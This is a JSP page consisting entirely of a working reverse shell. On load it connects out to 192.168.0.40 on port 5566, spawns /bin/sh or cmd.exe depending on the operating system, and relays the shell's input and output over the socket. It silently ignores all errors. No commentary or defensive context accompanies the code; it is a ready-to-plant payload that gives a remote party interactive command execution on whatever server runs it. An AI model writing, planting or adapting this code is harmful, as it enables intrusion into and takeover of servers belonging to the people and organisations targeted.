<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream fw;
    OutputStream ze;

    StreamConnector( InputStream fw, OutputStream ze )
    {
      this.fw = fw;
      this.ze = ze;
    }

    public void run()
    {
      BufferedReader lw  = null;
      BufferedWriter lrm = null;
      try
      {
        lw  = new BufferedReader( new InputStreamReader( this.fw ) );
        lrm = new BufferedWriter( new OutputStreamWriter( this.ze ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = lw.read( buffer, 0, buffer.length ) ) > 0 )
        {
          lrm.write( buffer, 0, length );
          lrm.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( lw != null )
          lw.close();
        if( lrm != null )
          lrm.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "192.168.0.40", 5566 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
